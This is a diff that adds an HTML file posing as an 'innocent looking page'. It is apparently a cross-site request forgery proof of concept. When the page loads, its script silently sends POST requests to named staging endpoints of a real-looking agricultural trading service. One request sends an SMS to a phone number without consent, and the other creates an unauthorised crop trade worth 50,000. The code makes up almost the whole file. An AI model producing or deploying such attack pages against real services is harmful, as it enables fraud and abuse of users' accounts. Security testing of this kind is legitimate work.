@@ -1,0 +1,53 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Innocent Looking Page</title>
+</head>
+<body>
+    <h1>Welcome to our site!</h1>
+    <p>Loading content...</p>
+    
+    <script>
+    // CSRF Attack payload
+    async function csrfAttack() {
+        try {
+            // Attack 1: Send SMS without user consent
+            const smsResponse = await fetch('https://ml-stage.farmartos.com/v3/message/send', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                    // Note: Authorization header would need to be obtained somehow
+                },
+                body: JSON.stringify({
+                    "message": "Malicious SMS from CSRF attack",
+                    "recipient": "919999999999"
+                })
+            });
+            
+            console.log('SMS attack result:', await smsResponse.text());
+            
+            // Attack 2: Create unauthorized trade
+            const tradeResponse = await fetch('https://ml-stage.farmartos.com/v3/trade/create', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    "crop_id": 1,
+                    "quantity": 1000,
+                    "price": 50000
+                })
+            });
+            
+            console.log('Trade attack result:', await tradeResponse.text());
+            
+        } catch (error) {
+            console.log('Attack failed:', error);
+        }
+    }
+    
+    // Execute attack when page loads
+    window.onload = csrfAttack;
+    </script>
+</body>
+</html>
